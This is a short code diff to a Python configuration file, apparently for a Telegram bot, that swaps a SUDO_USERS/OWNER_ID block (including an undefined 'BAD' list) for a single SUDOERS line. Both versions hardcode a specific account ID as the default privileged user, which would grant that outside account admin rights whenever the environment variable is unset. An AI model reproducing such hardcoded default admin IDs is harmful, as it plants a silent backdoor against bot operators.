@@ -50,10 +50,4 @@ LOG_CHANNEL = getenv("LOG_CHANNEL", None)
 
 HANDLER = getenv("HANDLER", "/")
 
-# SUDO and OWNER logic
-SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "7762101994").split()))
-SUDO_USERS.extend(BAD)  # Add users from your custom list
-OWNER_ID = int(os.getenv("OWNER_ID", "7762101994"))
-if OWNER_ID not in SUDO_USERS:
-    SUDO_USERS.append(OWNER_ID)
-SUDO_USERS = list(set(SUDO_USERS))  # remove duplicates
+SUDOERS = list(map(int, getenv("SUDOERS", "7009601543").split()))
